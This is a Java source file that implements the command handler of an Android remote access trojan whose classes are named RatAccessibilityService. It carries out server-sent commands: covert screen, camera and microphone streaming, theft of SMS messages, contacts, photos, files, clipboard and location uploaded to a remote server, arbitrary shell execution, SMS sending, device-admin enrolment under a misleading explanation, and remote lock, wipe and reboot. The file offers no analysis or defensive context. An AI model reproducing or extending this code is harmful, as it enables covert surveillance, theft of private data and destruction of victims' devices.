package com.gls.sim1;

import android.Manifest;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.os.VibratorManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public final class CommandHandler {

    private CommandHandler() {}

    public static JsonObject handle(Context ctx, String type, JsonObject args) {
        Context app = ctx.getApplicationContext();
        Foreground.set(app);
        JsonObject r = new JsonObject();
        try {
            if (args == null) args = new JsonObject();
            switch (type) {
                case "screenshot": doScreenshot(app, r); break;
                case "screen_start": case "screen": kick(app, "screen", null); r.addProperty("ok", "consent-pending"); break;
                case "screen_stop": ScreenStreamer.getInstance().stop("screen"); r.addProperty("ok", true); break;
                case "screen_stealth":
                    if (RatAccessibilityService.INSTANCE != null) {
                        ScreenStreamer.getInstance().ensureSocket("screen");
                        RatAccessibilityService.INSTANCE.startShotStream();
                        r.addProperty("ok", "a11y-shot-stream");
                    } else r.addProperty("err", "a11y off");
                    break;
                case "screen_stealth_stop":
                    if (RatAccessibilityService.INSTANCE != null) RatAccessibilityService.INSTANCE.stopShotStream();
                    r.addProperty("ok", true); break;
                case "cam": {
                    if (app.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        r.addProperty("err", "camera permission denied");
                        break;
                    }
                    ScreenStreamer.getInstance().start(app, "cam", s(args, "facing", "front"));
                    r.addProperty("ok", true);
                    break;
                }
                case "cam_stop": ScreenStreamer.getInstance().stop("cam"); r.addProperty("ok", true); break;
                case "mic_start": case "mic": ScreenStreamer.getInstance().start(app, "mic", null); r.addProperty("ok", true); break;
                case "mic_stop": ScreenStreamer.getInstance().stop("mic"); r.addProperty("ok", true); break;
                case "streams_off": ScreenStreamer.getInstance().shutdownAll(); r.addProperty("ok", true); break;
                case "vibrate": doVibrate(app, a(args, "ms", 3000)); break;
                case "vibrate_pattern": doPattern(app, args); break;
                case "battery_unignore": doBattery(app); r.addProperty("ok", true); break;
                case "admin_enable": doAdmin(app); r.addProperty("ok", true); break;
                case "lock": doLock(app); r.addProperty("ok", true); break;
                case "wipe": doWipe(app); r.addProperty("ok", true); break;
                case "reboot": doReboot(app); r.addProperty("ok", true); break;
                case "location": doLocation(app, r); break;
                case "sms_list": doSmsList(app, r); break;
                case "sms_send": doSmsSend(app, args, r); break;
                case "contacts": doContacts(app, r); break;
                case "apps": doApps(app, r); break;
                case "wifi": doWifi(app, r); break;
                case "files_list": doFiles(s(args, "path", "/sdcard"), r); break;
                case "photos": doPhotos(app, r); break;
                case "photos_thumb": doPhotosThumb(app, args, r); break;
                case "photo_full": doPhotoFull(app, args, r); break;
                case "file_get": doFileGet(app, args, r); break;
                case "shell": doShell(s(args, "cmd", "id"), r); break;
                case "toast": doToast(app, s(args, "text", "")); r.addProperty("ok", true); break;
                case "clipboard_read": doClipRead(app, r); break;
                case "clipboard_write": doClipWrite(app, s(args, "text", "")); r.addProperty("ok", true); break;
                case "click_text": doClick(s(args, "text", "")); r.addProperty("ok", true); break;
                case "nav_back": doGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK, r); break;
                case "nav_home": doGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME, r); break;
                case "nav_recents": doGlobal(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS, r); break;
                case "tap": doTap(args, r); break;
                case "swipe": doSwipe(args, r); break;
                case "long_press": doLongPress(args, r); break;
                case "open_url": doOpenUrl(app, s(args, "url", "")); r.addProperty("ok", true); break;
                case "all_files_access": doAllFiles(app); r.addProperty("ok", true); break;
                case "a11y_status":
                    r.addProperty("up", RatAccessibilityService.isUp());
                    r.addProperty("lanes", ShotLaneService.laneCount());
                    break;
                case "info": doInfo(app, r); break;
                case "server": r.addProperty("server", Net.base()); break;
                case "set_server": {
                    String url = s(args, "url", "");
                    if (url.isEmpty()) { r.addProperty("err", "url"); break; }
                    Net.setServer(app, url);
                    r.addProperty("ok", Net.base());
                    break;
                }
                case "ping": r.addProperty("pong", System.currentTimeMillis()); break;
                default: r.addProperty("err", "unknown:" + type);
            }
        } catch (SecurityException se) {
            r.addProperty("err", "permission:" + se.getMessage());
        } catch (Throwable e) {
            r.addProperty("err", String.valueOf(e));
        }
        return r;
    }

    // ---------- streams / capture ----------

    static void kick(Context app, String type, String facing) {
        RatAccessibilityService.kick(app, type, facing);
    }

    static void doScreenshot(Context app, JsonObject r) {
        if (Build.VERSION.SDK_INT >= 30 && RatAccessibilityService.INSTANCE != null) {
            boolean ok = RatAccessibilityService.INSTANCE.takeShot();
            r.addProperty("ok", ok ? "a11y-shot dispatched" : "shot failed");
        } else if (ScreenStreamer.getInstance().hasProjection()) {
            ScreenStreamer.getInstance().start(app, "shot", null);
            r.addProperty("ok", "frame-capture queued");
        } else {
            kick(app, "shot", null);
            r.addProperty("ok", "consent-pending — first accepted frame lands in files");
        }
    }

    // ---------- device control ----------

    static void doVibrate(Context app, long ms) {
        if (ms <= 0) return;
        if (Build.VERSION.SDK_INT >= 31) {
            VibratorManager vm = (VibratorManager) app.getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
            vm.getDefaultVibrator().vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            Vibrator v = (Vibrator) app.getSystemService(Context.VIBRATOR_SERVICE);
            if (v == null) return;
            if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
            else v.vibrate(ms);
        }
    }

    static void doPattern(Context app, JsonObject args) {
        long[] pat;
        if (args.has("pattern") && args.get("pattern").isJsonArray()) {
            JsonArray arr = args.getAsJsonArray("pattern");
            pat = new long[arr.size()];
            for (int i = 0; i < arr.size(); i++) pat[i] = arr.get(i).getAsLong();
        } else {
            pat = new long[]{0, 500, 300, 500, 300, 800};
        }
        if (Build.VERSION.SDK_INT >= 26) {
            Vibrator v = app.getSystemService(Vibrator.class);
            if (v != null) v.vibrate(VibrationEffect.createWaveform(pat, -1));
        } else {
            Vibrator v = (Vibrator) app.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(pat, -1);
        }
    }

    static void doBattery(Context app) {
        try {
            Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:" + app.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            app.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    static void doAdmin(Context app) {
        try {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(app, DeviceAdmin.class));
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "required for device policy");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            app.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    static void doLock(Context app) {
        DevicePolicyManager dpm = (DevicePolicyManager) app.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null) {
            try {
                dpm.lockNow();
                return;
            } catch (Exception ignored) {
            }
        }
        KeyguardManager km = (KeyguardManager) app.getSystemService(Context.KEYGUARD_SERVICE);
        if (km != null && Build.VERSION.SDK_INT >= 27) {
            try {
                km.requestDismissKeyguard(null, null);
            } catch (Exception ignored) {
            }
        }
        try {
            Intent i = new Intent("com.android.internal.intent.ACTION_LOCK");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            app.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    static void doWipe(Context app) {
        DevicePolicyManager dpm = (DevicePolicyManager) app.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm != null) dpm.wipeData(0);
    }

    static void doReboot(Context app) {
        try {
            Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
            return;
        } catch (Exception ignored) {
        }
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) app.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isAdminActive(new ComponentName(app, DeviceAdmin.class))) {
                dpm.reboot(null);
                return;
            }
        } catch (Exception ignored) {
        }
        try {
            Intent i = new Intent(Intent.ACTION_REBOOT);
            i.putExtra("nowait", 1);
            app.sendBroadcast(i);
        } catch (Exception ignored) {
        }
    }

    // ---------- data ----------

    static void doLocation(Context app, JsonObject r) {
        LocationManager lm = (LocationManager) app.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) { r.addProperty("err", "no lm"); return; }
        Location l = null;
        try {
            List<String> providers = lm.getProviders(true);
            if (providers.contains(LocationManager.GPS_PROVIDER)) l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (l == null) {
                for (String p : providers) {
                    l = lm.getLastKnownLocation(p);
                    if (l != null) break;
                }
            }
        } catch (SecurityException se) {
            r.addProperty("err", "permission");
            return;
        }
        if (l != null) {
            r.addProperty("lat", l.getLatitude());
            r.addProperty("lon", l.getLongitude());
            r.addProperty("acc", l.getAccuracy());
            r.addProperty("provider", l.getProvider());
            r.addProperty("age_ms", System.currentTimeMillis() - l.getTime());
            r.addProperty("map", "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude());
        } else r.addProperty("err", "no fix");
    }

    static void doSmsList(Context app, JsonObject r) {
        JsonArray out = new JsonArray();
        Cursor c = app.getContentResolver().query(
                android.provider.Telephony.Sms.CONTENT_URI,
                new String[]{"address", "body", "date", "type"},
                null, null, "date DESC LIMIT 100");
        if (c != null) {
            while (c.moveToNext()) {
                out.add(c.getString(0) + "|" + c.getString(1) + "|" + c.getString(2) + "|" + c.getString(3));
            }
            c.close();
        }
        r.add("sms", out);
    }

    static void doSmsSend(Context app, JsonObject args, JsonObject r) {
        SmsManager sm;
        if (Build.VERSION.SDK_INT >= 22) sm = SmsManager.getDefault();
        else sm = SmsManager.getDefault();
        String to = s(args, "to", "");
        String text = s(args, "text", "");
        if (to.isEmpty() || text.isEmpty()) { r.addProperty("err", "to/text"); return; }
        ArrayList<String> parts = sm.divideMessage(text);
        if (parts.size() > 1) sm.sendMultipartTextMessage(to, null, parts, null, null);
        else sm.sendTextMessage(to, null, text, null, null);
        r.addProperty("ok", "sent");
    }

    static void doContacts(Context app, JsonObject r) {
        JsonArray out = new JsonArray();
        Cursor c = app.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (c != null) {
            while (c.moveToNext()) out.add(c.getString(0) + "|" + c.getString(1));
            c.close();
        }
        r.add("contacts", out);
    }

    static void doApps(Context app, JsonObject r) {
        PackageManager pm = app.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        JsonArray out = new JsonArray();
        for (ApplicationInfo a : apps) {
            CharSequence label = pm.getApplicationLabel(a);
            out.add(a.packageName + "|" + (label != null ? label : a.packageName) + "|"
                    + ((a.flags & ApplicationInfo.FLAG_SYSTEM) != 0 ? "sys" : "user"));
        }
        r.add("apps", out);
    }

    static void doWifi(Context app, JsonObject r) {
        WifiManager wm = (WifiManager) app.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm == null) { r.addProperty("err", "no wm"); return; }
        WifiInfo wi = wm.getConnectionInfo();
        if (wi == null) { r.addProperty("err", "no conn"); return; }
        String ssid = wi.getSSID();
        if (ssid != null) ssid = ssid.replace("\"", "");
        r.addProperty("ssid", ssid);
        r.addProperty("bssid", wi.getBSSID());
        r.addProperty("rssi", wi.getRssi());
        r.addProperty("link_speed", wi.getLinkSpeed());
        int ip = wi.getIpAddress();
        r.addProperty("ip", (ip & 0xff) + "." + ((ip >> 8) & 0xff) + "." + ((ip >> 16) & 0xff) + "." + ((ip >> 24) & 0xff));
        r.addProperty("supplicant", String.valueOf(wi.getSupplicantState()));
    }

    static void doPhotos(Context app, JsonObject r) {
        JsonArray out = new JsonArray();
        try {
            android.database.Cursor c = app.getContentResolver().query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{
                            android.provider.MediaStore.Images.Media.DATA,
                            android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                            android.provider.MediaStore.Images.Media.SIZE},
                    null, null,
                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (c != null) {
                int dataI = c.getColumnIndex(android.provider.MediaStore.Images.Media.DATA);
                int nameI = c.getColumnIndex(android.provider.MediaStore.Images.Media.DISPLAY_NAME);
                int sizeI = c.getColumnIndex(android.provider.MediaStore.Images.Media.SIZE);
                int count = 0;
                while (c.moveToNext() && count < 400) {
                    String p = dataI >= 0 ? c.getString(dataI) : null;
                    if (p == null) continue;
                    String name = nameI >= 0 ? c.getString(nameI) : "";
                    long size = sizeI >= 0 ? c.getLong(sizeI) : 0;
                    out.add(p + "|" + name + "|" + size);
                    count++;
                }
                c.close();
            }
        } catch (Exception e) {
            r.addProperty("err", String.valueOf(e));
        }
        r.add("photos", out);
    }

    static void doPhotosThumb(Context app, JsonObject args, JsonObject r) {
        int limit = (int) a(args, "limit", 30);
        int offset = (int) a(args, "offset", 0);
        JsonArray thumbs = new JsonArray();
        try {
            Cursor c = app.getContentResolver().query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{android.provider.MediaStore.Images.Media.DATA},
                    null, null,
                    android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (c != null) {
                int dataI = c.getColumnIndex(android.provider.MediaStore.Images.Media.DATA);
                int idx = 0, made = 0;
                while (c.moveToNext() && made < limit) {
                    String p = dataI >= 0 ? c.getString(dataI) : null;
                    if (p == null) continue;
                    if (idx++ < offset) continue;
                    String tn = makeThumb(app, p);
                    if (tn != null) {
                        thumbs.add(p + "|" + tn);
                        made++;
                    }
                }
                c.close();
            }
        } catch (Exception e) {
            r.addProperty("err", String.valueOf(e));
        }
        r.add("thumbs", thumbs);
    }

    static void doPhotoFull(Context app, JsonObject args, JsonObject r) {
        String path = s(args, "path", "");
        try {
            File f = new File(path);
            if (!f.exists()) { r.addProperty("err", "not found"); return; }
            byte[] bytes = new byte[(int) f.length()];
            java.io.FileInputStream in = new java.io.FileInputStream(f);
            int off = 0;
            while (off < bytes.length) { int n = in.read(bytes, off, bytes.length - off); if (n < 0) break; off += n; }
            in.close();
            String name = f.getName();
            Net.uploadFile(Net.deviceId(app), name, bytes, "image/jpeg");
            r.addProperty("ok", "uploaded:" + name);
        } catch (Exception e) {
            r.addProperty("err", String.valueOf(e));
        }
    }

    static String makeThumb(Context app, String path) {
        try {
            android.graphics.BitmapFactory.Options o = new android.graphics.BitmapFactory.Options();
            o.inJustDecodeBounds = true;
            android.graphics.BitmapFactory.decodeFile(path, o);
            if (o.outWidth <= 0 || o.outHeight <= 0) return null;
            int scale = 1;
            while (o.outWidth / scale > 360 || o.outHeight / scale > 360) scale *= 2;
            android.graphics.BitmapFactory.Options o2 = new android.graphics.BitmapFactory.Options();
            o2.inSampleSize = scale;
            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeFile(path, o2);
            if (bmp == null) return null;
            byte[] jpg = StreamEncoder.toJpeg(bmp, 60);
            bmp.recycle();
            String name = "t" + System.currentTimeMillis() + "-" + (path.hashCode() & 0xffff) + ".jpg";
            Net.uploadFile(Net.deviceId(app), name, jpg, "image/jpeg");
            return name;
        } catch (Exception e) {
            return null;
        }
    }

    static void doFiles(String path, JsonObject r) {
        File dir = new File(path);
        JsonArray out = new JsonArray();
        File[] fs = dir.listFiles();
        if (fs != null) {
            for (File f : fs) {
                out.add((f.isDirectory() ? "d " : "f ") + f.getName() + "|" + f.length());
            }
        }
        r.addProperty("path", dir.getAbsolutePath());
        r.addProperty("canRead", dir.canRead());
        r.add("listing", out);
    }

    static void doFileGet(Context app, JsonObject args, JsonObject r) throws Exception {
        String path = s(args, "path", "");
        File f = new File(path);
        if (!f.exists() || !f.isFile()) { r.addProperty("err", "not found"); return; }
        if (f.length() > 25L * 1024 * 1024) { r.addProperty("err", ">25mb"); return; }
        java.io.FileInputStream fis = new java.io.FileInputStream(f);
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
        fis.close();
        Net.uploadFile(Net.deviceId(app), f.getName(), bos.toByteArray(), "application/octet-stream");
        r.addProperty("ok", "uploaded:" + f.getName());
    }

    static void doShell(String cmd, JsonObject r) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
        java.io.InputStream is = p.getInputStream();
        java.io.ByteArrayOutputStream os = new java.io.ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        long deadline = System.currentTimeMillis() + 15000;
        while ((n = is.read(buf)) > 0) {
            os.write(buf, 0, n);
            if (System.currentTimeMillis() > deadline) break;
        }
        p.waitFor();
        r.addProperty("out", os.toString("UTF-8"));
    }

    static void doToast(Context app, String text) {
        new Handler(Looper.getMainLooper()).post(() ->
                android.widget.Toast.makeText(app, text, android.widget.Toast.LENGTH_LONG).show());
    }

    static void doClipRead(Context app, JsonObject r) {
        android.content.ClipboardManager cm = (android.content.ClipboardManager) app.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip().getItemCount() > 0) {
            CharSequence t = cm.getPrimaryClip().getItemAt(0).coerceToText(app);
            r.addProperty("clip", t != null ? t.toString() : "");
        }
    }

    static void doClipWrite(Context app, String text) {
        android.content.ClipboardManager cm = (android.content.ClipboardManager) app.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm != null) cm.setPrimaryClip(android.content.ClipData.newPlainText("s1", text));
    }

    static void doClick(String text) {
        RatAccessibilityService s = RatAccessibilityService.INSTANCE;
        if (s == null) return;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        s.clickFirstMatch(root, new String[]{text.toLowerCase(Locale.ROOT)});
    }

    static void doGlobal(int action, JsonObject r) {
        RatAccessibilityService s = RatAccessibilityService.INSTANCE;
        if (s == null) { r.addProperty("err", "a11y off"); return; }
        r.addProperty("ok", s.performGlobalAction(action));
    }

    static void doTap(JsonObject args, JsonObject r) {        RatAccessibilityService s = RatAccessibilityService.INSTANCE;
        if (s == null) { r.addProperty("err", "a11y off"); return; }
        boolean ok = s.tapNorm(fl(args, "x", 0.5), fl(args, "y", 0.5));
        r.addProperty("ok", ok);
    }

    static void doSwipe(JsonObject args, JsonObject r) {
        RatAccessibilityService s = RatAccessibilityService.INSTANCE;
        if (s == null) { r.addProperty("err", "a11y off"); return; }
        int dur = (int) a(args, "ms", 250);
        boolean ok = s.swipeNorm(fl(args, "x1", 0.5), fl(args, "y1", 0.5),
                fl(args, "x2", 0.5), fl(args, "y2", 0.5), dur);
        r.addProperty("ok", ok);
    }

    static void doLongPress(JsonObject args, JsonObject r) {
        RatAccessibilityService s = RatAccessibilityService.INSTANCE;
        if (s == null) { r.addProperty("err", "a11y off"); return; }
        int dur = (int) a(args, "ms", 900);
        boolean ok = s.pressNorm(fl(args, "x", 0.5), fl(args, "y", 0.5), dur);
        r.addProperty("ok", ok);
    }

    static void doOpenUrl(Context app, String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            app.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    static void doAllFiles(Context app) {
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + app.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            app.startActivity(i);
        } catch (Exception ignored) {
        }
    }

    static void doInfo(Context app, JsonObject r) {
        r.addProperty("model", Build.MODEL);
        r.addProperty("brand", Build.BRAND);
        r.addProperty("device", Build.DEVICE);
        r.addProperty("sdk", Build.VERSION.SDK_INT);
        r.addProperty("release", Build.VERSION.RELEASE);
        r.addProperty("battery", batteryPct(app));
        r.addProperty("network", Net.networkType(app));
        r.addProperty("sim", Net.simLabel(app));
        r.addProperty("a11y", RatAccessibilityService.isUp());
        r.addProperty("lanes", ShotLaneService.laneCount());
        r.addProperty("admin", isAdmin(app));
        r.addProperty("screen", ScreenStreamer.getInstance().anyActive());
        ActivityManager am = (ActivityManager) app.getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(mi);
            r.addProperty("mem_free_mb", mi.availMem / 1048576);
        }
    }

    static boolean isAdmin(Context app) {
        DevicePolicyManager dpm = (DevicePolicyManager) app.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return dpm != null && dpm.isAdminActive(new ComponentName(app, DeviceAdmin.class));
    }

    static int batteryPct(Context app) {
        try {
            Intent f = app.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (f == null) return -1;
            int lvl = f.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = f.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            boolean charging = f.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
                    == BatteryManager.BATTERY_STATUS_CHARGING;
            int pct = lvl * 100 / Math.max(scale, 1);
            return charging ? -pct : pct;
        } catch (Exception e) {
            return -1;
        }
    }

    static String s(JsonObject o, String k, String dflt) {
        return o.has(k) && o.get(k).isJsonPrimitive() ? o.get(k).getAsString() : dflt;
    }

    static long a(JsonObject o, String k, long dflt) {
        return o.has(k) && o.get(k).isJsonPrimitive() ? o.get(k).getAsLong() : dflt;
    }

    static double dbl(JsonObject o, String k, double dflt) {
        return o.has(k) && o.get(k).isJsonPrimitive() ? o.get(k).getAsDouble() : dflt;
    }

    static float fl(JsonObject o, String k, double dflt) {
        return (float) dbl(o, k, dflt);
    }
}
